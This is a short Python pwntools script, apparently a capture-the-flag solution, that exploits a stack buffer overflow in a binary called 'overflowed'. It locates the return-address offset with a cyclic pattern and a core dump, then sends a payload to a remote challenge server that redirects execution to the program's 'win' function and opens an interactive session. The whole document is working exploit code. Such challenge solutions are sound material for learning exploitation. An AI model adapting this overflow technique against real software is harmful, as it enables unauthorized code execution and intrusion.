from pwn import *

exe = "./overflowed"
elf = context.binary = ELF(exe, checksec=False)

def find_eip_offset(payload):
   p = process(exe)
   p.sendlineafter(b"name:\n",payload)
   p.wait()
   ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
   info('located EIP/RIP offset at {a}'.format(a=ip_offset)),
   return ip_offset

r = remote("0.cloud.chals.io", 33664)

# r = process(exe)

offset = find_eip_offset(cyclic(500))
print(offset)

hackedAdd = elf.symbols.win
print(hex(hackedAdd))

# 0x00000000004011b9
payload = flat({
   offset: [
      hackedAdd
   ]
})

r.sendlineafter(b"name:\n", payload)
r.interactive()